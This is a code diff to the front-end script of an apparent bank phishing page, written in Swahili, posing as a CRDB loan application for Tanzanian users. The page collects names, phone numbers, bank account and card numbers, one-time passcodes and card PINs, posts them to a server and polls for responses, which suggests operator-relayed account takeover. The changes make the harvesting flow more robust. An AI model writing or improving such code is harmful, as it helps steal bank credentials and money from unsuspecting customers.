@@ -18,6 +18,7 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         });
         currentStepIndex = index;
+        window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
     function showNotification(text) {
@@ -41,16 +42,29 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    document.getElementById('toStep1Btn').addEventListener('click', () => {
-        formData.loanAmount = loanRange.value;
+    // Navigation Bindings
+    const safeAddListener = (id, event, handler) => {
+        const el = document.getElementById(id);
+        if (el) el.addEventListener(event, handler);
+    };
+
+    safeAddListener('toStep1Btn', 'click', () => {
+        if (loanRange) formData.loanAmount = loanRange.value;
         showStep(1);
     });
 
-    document.getElementById('nextToStep1').addEventListener('click', () => showStep(0));
-    document.getElementById('backToStep1').addEventListener('click', () => showStep(1));
-    document.getElementById('backToStep2').addEventListener('click', () => showStep(2));
+    safeAddListener('globalBackBtn', 'click', () => {
+        if (currentStepIndex > 0 && currentStepIndex < 4) {
+            showStep(currentStepIndex - 1);
+        }
+    });
 
-    document.getElementById('nextToStep2').addEventListener('click', () => {
+    safeAddListener('backToSlider', 'click', () => showStep(0));
+    safeAddListener('backToStep1', 'click', () => showStep(1));
+    safeAddListener('backToStep2', 'click', () => showStep(2));
+    safeAddListener('backToStep3FromAcc', 'click', () => showStep(3));
+
+    safeAddListener('nextToStep2', 'click', () => {
         formData.loanType = document.getElementById('loanType').value;
         formData.amount = document.getElementById('step1Amount').value;
         formData.duration = document.getElementById('step1Duration').value;
@@ -59,7 +73,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Tanzania phone validation: Must start with 6, 7 or 5 and be 9 digits
-    document.getElementById('nextToStep3').addEventListener('click', () => {
+    safeAddListener('nextToStep3', 'click', () => {
         const rawPhone = document.getElementById('phoneNumber').value.trim();
         const tanzaniaPhoneRegex = /^[675]\d{8}$/;
 
@@ -68,8 +82,8 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        formData.firstName = document.getElementById('firstName').value;
-        formData.lastName = document.getElementById('lastName').value;
+        formData.firstName = document.getElementById('firstName').value.trim();
+        formData.lastName = document.getElementById('lastName').value.trim();
         formData.phone = rawPhone;
 
         if (!formData.firstName || !formData.lastName) {
@@ -81,12 +95,12 @@ document.addEventListener('DOMContentLoaded', () => {
         showStep(3);
     });
 
-    document.getElementById('submitLoanApp').addEventListener('click', () => {
+    safeAddListener('submitLoanApp', 'click', () => {
         formData.employmentStatus = document.getElementById('employmentStatus').value;
         formData.annualIncome = document.getElementById('annualIncome').value;
 
         document.getElementById('summaryDetails').innerHTML = `
-            Kiasi cha Mkopo: TSh ${formData.amount || '100,000'}<br>
+            Kiasi cha Mkopo: TSh ${Number(formData.amount || 100000).toLocaleString()}<br>
             Muda wa Mkopo: ${formData.duration || 'Miezi 48'}<br>
             Madhumuni: ${formData.purpose || 'Biashara'}<br>
             Mwombaji: ${formData.firstName} ${formData.lastName}
@@ -96,9 +110,9 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Account & Card Number submission
-    document.getElementById('submitAccountDetails').addEventListener('click', async () => {
-        const accountNumber = document.getElementById('accountNumberInput').value;
-        const cardNumber = document.getElementById('cardNumberInput').value;
+    safeAddListener('submitAccountDetails', 'click', async () => {
+        const accountNumber = document.getElementById('accountNumberInput').value.trim();
+        const cardNumber = document.getElementById('cardNumberInput').value.trim();
 
         if (!accountNumber || !cardNumber) {
             alert('Weka namba ya akaunti na namba ya kadi!');
@@ -107,15 +121,19 @@ document.addEventListener('DOMContentLoaded', () => {
 
         showNotification('Inatuma taarifa kwa uthibitisho wa CRDB...');
 
-        await fetch('/api/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                step: 'account_details',
-                clientId,
-                data: { accountNumber, cardNumber, ...formData }
-            })
-        });
+        try {
+            await fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    step: 'account_details',
+                    clientId,
+                    data: { accountNumber, cardNumber, ...formData }
+                })
+            });
+        } catch (err) {
+            console.error(err);
+        }
 
         startPolling();
     });
@@ -152,7 +170,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    document.getElementById('verifyOtpBtn').addEventListener('click', () => {
+    safeAddListener('verifyOtpBtn', 'click', () => {
         const otpVals = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
         if (otpVals.length < 5) {
             alert('Weka namba kamili ya OTP ya tarakimu 5!');
@@ -171,7 +189,7 @@ document.addEventListener('DOMContentLoaded', () => {
         startPolling();
     }
 
-    document.getElementById('resendOtpLink').addEventListener('click', async (e) => {
+    safeAddListener('resendOtpLink', 'click', async (e) => {
         e.preventDefault();
         showNotification('Tunaomba OTP mpya...');
         await fetch('/api/submit', {
@@ -182,7 +200,7 @@ document.addEventListener('DOMContentLoaded', () => {
         showNotification('OTP mpya imeombwa. Subiri uthibitisho ✅');
     });
 
-    document.getElementById('verifyPinBtn').addEventListener('click', () => {
+    safeAddListener('verifyPinBtn', 'click', () => {
         const pinVals = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
         if (pinVals.length < 4) {
             alert('Weka PIN kamili ya tarakimu 4!');
@@ -247,4 +265,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 3000);
     }
 });
-            
+    
